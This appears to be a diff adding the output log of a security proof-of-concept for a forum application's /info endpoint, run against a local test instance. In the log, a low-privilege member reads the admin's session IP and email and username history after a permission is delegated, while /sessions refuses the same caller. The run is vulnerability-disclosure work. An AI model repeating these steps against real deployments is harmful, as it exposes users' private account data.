@@ -1,0 +1,19 @@
+==============================================================================
+VULN-021: /info over-exposes session IP/UA + email/username history (config-gated)
+Target: http://localhost:21372
+==============================================================================
+[INFO] info.js:29-39 assigns sessions/emails/usernames unconditionally; /info gate is view:users:info
+[SETUP] admin delegates groups:view:users:info to registered-users (global cid 0) — a supported ACP choice
+[INFO] grant HTTP 200
+[SETUP] creating low-priv member viewer_e5d1f598
+[INFO] viewer session uid=5 isAdmin=False isGlobalMod=False (must be False)
+[STEP] viewer GET /api/user/admin/info (the delegated, weaker-gated endpoint)
+[INFO] /info HTTP 200 | sessions=10 (first ip='172.18.0.1') | emails=['admin@example.com'] | usernames=['admin']
+[STEP] viewer GET /api/user/admin/sessions (dedicated endpoint, requires canEdit) — control
+[INFO] /sessions HTTP 403 (expect 403 — proves /info is a weaker gate for the same data)
+[PROOF] a delegated non-privileged member read admin's session IP (172.18.0.1), email history and username history via /info, while /sessions returned 403 for the same caller -> authorization divergence / over-exposure
+[SETUP] restoring: rescinding groups:view:users:info from registered-users
+[INFO] privilege restored
+------------------------------------------------------------------------------
+[OK] exploit confirmed — /info exposes session IP/UA + email/username history under view:users:info
+==> VULN-021: CONFIRMED — /info over-exposure vs /sessions (authorization divergence, config-gated)
